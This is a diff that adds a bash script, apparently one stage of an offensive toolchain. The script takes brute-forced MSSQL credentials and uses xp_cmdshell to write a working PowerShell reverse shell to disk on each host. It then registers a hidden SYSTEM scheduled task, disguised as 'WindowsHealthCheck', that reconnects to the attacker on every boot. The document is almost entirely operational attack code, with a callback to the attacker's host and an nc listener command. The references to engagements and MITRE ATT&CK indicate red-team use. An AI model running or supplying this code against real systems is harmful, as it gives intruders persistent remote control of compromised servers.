@@ -1,0 +1,100 @@
+#!/usr/bin/env bash
+
+# 05_persist — Establish Persistence via Scheduled Task
+
+# For each compromised MSSQL host, drops a PowerShell reverse shell script
+# to disk and creates a scheduled task that fires on system boot.
+
+OUTDIR="./recon"
+CREDS_FILE="$OUTDIR/hosts/mssql-creds.txt"
+PERSIST_DIR="$OUTDIR/persist"
+mkdir -p "$PERSIST_DIR"
+
+LHOST=$(ip -br a | grep -v '^lo' | awk '{print $3}' | cut -d/ -f1 | head -1)
+LPORT="${1:-4444}"
+
+# CONFIGURABLE TASK NAME -- Change this if your engagement requires a
+# different name for OPSEC or to avoid collisions with real scheduled tasks.
+
+TASK_NAME="WindowsHealthCheck"
+
+
+if [[ ! -f "$CREDS_FILE" ]]; then
+    echo "[-] $CREDS_FILE not found. Run 02_bruteforce first."
+    exit 1
+fi
+
+echo "[*] Starting persistence phase"
+echo "[*] Attacker IP: $LHOST  |  Callback port: $LPORT"
+echo "[*] Scheduled task name: $TASK_NAME"
+echo ""
+echo "[ ! ] You can change the scheduled task name by editing the TASK_NAME"
+echo "      variable at the top of this script (currently: $TASK_NAME)."
+echo ""
+echo "[ ! ] To verify persistence, start a listener before rebooting the target:"
+echo "      nc -nlvp $LPORT"
+echo ""
+
+while IFS=: read -r TARGET_IP TARGET_PORT USER PASS; do
+    [[ -z "$USER" || -z "$PASS" ]] && continue
+
+    echo "[*] Target: $TARGET_IP:$TARGET_PORT  |  User: $USER"
+
+    SAFE_TARGET="${TARGET_IP//./_}"
+    PERSIST_LOG="$PERSIST_DIR/${SAFE_TARGET}_persist.txt"
+
+    xp() {
+        local CMD="$1"
+        printf "exec master..xp_cmdshell '%s';\nexit\n" "$CMD" | \
+            mssqlclient "${USER}:${PASS}@${TARGET_IP}" -port "$TARGET_PORT" 2>&1
+    }
+
+    # Drop a PowerShell reverse shell one-liner into a script on disk
+    PAYLOAD_PATH="c:\\windows\\temp\\healthcheck.ps1"
+    PS_PAYLOAD="\$c=New-Object System.Net.Sockets.TCPClient(\\\"${LHOST}\\\",${LPORT});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$t=(New-Object -TypeName System.Text.ASCIIEncoding).GetBytes(\$r);\$s.Write(\$t,0,\$t.Length);\$s.Flush()};\$c.Close()"
+
+    echo "[*] Step 1: Writing payload to $PAYLOAD_PATH..."
+    xp "echo ${PS_PAYLOAD} > ${PAYLOAD_PATH}" | \
+        grep -v "^$\|SQL\|Impacket\|Press\|\[!\]" | tee -a "$PERSIST_LOG"
+
+    # Verify payload landed
+    VERIFY=$(xp "dir ${PAYLOAD_PATH}" 2>&1)
+    if echo "$VERIFY" | grep -qi "healthcheck"; then
+        echo "[+] Payload written successfully."
+    else
+        echo "[-] Could not confirm payload on disk. Proceeding anyway..."
+    fi
+
+    echo "[*] Step 2: Creating scheduled task '$TASK_NAME'..."
+    xp "schtasks /create /tn ${TASK_NAME} /tr \"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ${PAYLOAD_PATH}\" /sc onstart /ru SYSTEM /f" | \
+        grep -v "^$\|SQL\|Impacket\|Press\|\[!\]" | tee -a "$PERSIST_LOG"
+
+    # Verify task creation
+    TASK_CHECK=$(xp "schtasks /query /tn ${TASK_NAME}" 2>&1)
+    if echo "$TASK_CHECK" | grep -qi "$TASK_NAME"; then
+        echo "[+] Scheduled task created successfully."
+    else
+        echo "[-] Could not confirm scheduled task. Check manually."
+    fi
+
+    # Log persistence details for the report
+    cat >> "$PERSIST_LOG" <<EOF
+
+--- Persistence Summary ---
+Target:         $TARGET_IP:$TARGET_PORT
+Method:         Scheduled Task (schtasks)
+Task Name:      $TASK_NAME
+Trigger:        On system startup (ONSTART)
+Run As:         SYSTEM
+Payload Path:   $PAYLOAD_PATH
+Callback:       $LHOST:$LPORT
+Timestamp:      $(date -u +"%Y-%m-%dT%H:%M:%SZ")
+MITRE ATT&CK:  T1053.005 - Scheduled Task/Job: Scheduled Task
+EOF
+
+    echo "[+] Persistence log saved to $PERSIST_LOG"
+    echo ""
+
+done < "$CREDS_FILE"
+
+echo "[+] Persistence phase complete."
